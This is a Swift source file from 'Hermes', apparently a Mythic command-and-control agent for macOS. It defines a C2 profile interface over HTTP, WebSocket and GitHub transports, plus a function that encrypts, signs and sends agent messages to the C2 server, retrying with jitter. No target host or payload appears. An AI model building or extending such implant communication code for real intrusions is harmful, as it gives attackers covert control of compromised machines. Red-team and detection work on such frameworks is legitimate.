//
//  c2_protocol.swift
//  Hermes
//
//  C2 Profile Protocol Abstraction
//  Defines the interface that all C2 profiles must implement
//

import Foundation

// Protocol defining the interface for all C2 communication profiles
protocol C2Profile {
    // Send data to the C2 server and return the response
    func send(data: String) -> String
    
    // Initialize the profile connection
    func initialize() -> Bool
    
    // Check if the profile is currently connected
    var isConnected: Bool { get }
    
    // Profile name for identification
    var profileName: String { get }
}

// Enum to identify available C2 profile types
enum C2ProfileType: String {
    case http = "http"
    case websocket = "websocket"
    case github = "github"
}

// C2 Profile Manager - handles profile selection and message routing
class C2ProfileManager {
    private var activeProfile: C2Profile?
    private var profileType: C2ProfileType
    
    init(profileType: C2ProfileType) {
        self.profileType = profileType
    }
    
    // Initialize the appropriate profile based on type
    func initializeProfile() -> Bool {
        switch profileType {
        case .http:
            activeProfile = HTTPProfile()
        case .websocket:
            activeProfile = WebSocketProfile()
        case .github:
            activeProfile = GitHubProfile()
        }
        
        return activeProfile?.initialize() ?? false
    }
    
    // Send a message through the active profile
    func send(data: String) -> String {
        guard let profile = activeProfile else {
            return "NO_CONNECT"
        }
        return profile.send(data: data)
    }
    
    // Check connection status
    var isConnected: Bool {
        return activeProfile?.isConnected ?? false
    }
    
    // Get the active profile name
    var profileName: String {
        return activeProfile?.profileName ?? "none"
    }
}

// Global profile manager instance - will be initialized based on config
var profileManager: C2ProfileManager!

// Wrapper to send Hermes message using the active C2 profile
// This replaces the HTTP-specific sendHermesMessage function
func sendHermesMessage(jsonMessage: JSON, payloadUUID: Data, decodedAESKey: Data) -> JSON {
    // Generate iv, encrypt message, and determine hmac
    let iv = generateIV()
    let ciphertext = try! CC.crypt(.encrypt, blockMode: .cbc, algorithm: .aes, padding: .pkcs7Padding, data: jsonMessage.rawData(), key: decodedAESKey, iv: iv)
    let hmac = CC.HMAC(iv+ciphertext, alg: .sha256, key: decodedAESKey)

    // Assemble message B64(PayloadUUID + IV + Ciphertext + HMAC)
    let hermesMessage = toBase64(data: payloadUUID + iv + ciphertext + hmac)

    // Send message through the active C2 profile
    var mythicMessage = "NO_CONNECT"
    while mythicMessage == "NO_CONNECT" {
        mythicMessage = profileManager.send(data: hermesMessage)
        if mythicMessage == "NO_CONNECT" {
            sleepWithJitter()
        }
    }
    
    // Decode and decrypt Mythic message to JSON string
    let decryptedMythicMessage = decryptMythicMessage(mythicMessage: mythicMessage, key: decodedAESKey, iv: iv)

    // Convert JSON string to object
    let jsonResponse = JSON.init(parseJSON: decryptedMythicMessage)
    
    return jsonResponse
}
